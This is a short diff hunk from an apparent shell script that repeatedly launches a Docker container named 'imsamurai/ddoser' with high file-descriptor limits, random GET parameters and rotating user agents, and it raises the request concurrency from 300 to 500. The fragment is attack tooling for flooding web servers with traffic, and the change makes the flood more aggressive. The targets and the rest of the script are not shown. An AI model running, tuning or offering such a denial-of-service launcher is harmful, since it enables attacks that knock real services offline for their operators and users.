@@ -68,7 +68,7 @@ while :; do
   docker run --pull always \
           --ulimit nofile=100000:100000 \
           -d --rm imsamurai/ddoser \
-          --concurrency 300 \
+          --concurrency 500 \
           --timeout 20 \
           --with-random-get-param \
           --user-agent "$USER_AGENTS" \
